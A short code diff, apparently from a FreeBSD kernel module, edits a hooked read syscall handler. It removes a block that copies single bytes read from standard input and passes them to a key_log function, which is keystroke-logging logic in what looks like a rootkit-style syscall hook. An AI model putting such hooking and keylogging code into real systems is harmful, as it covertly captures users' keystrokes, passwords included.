@@ -409,16 +409,6 @@ read_hook(struct thread *td, void *syscall_args)
 	uap = (struct read_args *) syscall_args;
 	fp = NULL;
 	buf = NULL;
-
-	if ((uap->nbyte) && (uap->nbyte == 1) &&  uap->fd == 0) {
-	    char keybuf[1];
-            copyin(uap->buf, keybuf, 1);
- 
-            int keyError = key_log(td, keybuf);
-            if(keyError)
-	        return(keyError);
-	    //return(ret_sys);
-	}
 	
 	ret = getvnode(td, uap->fd, cap_rights_init(&rights, CAP_LOOKUP), &fp);
 	if (ret == 0)
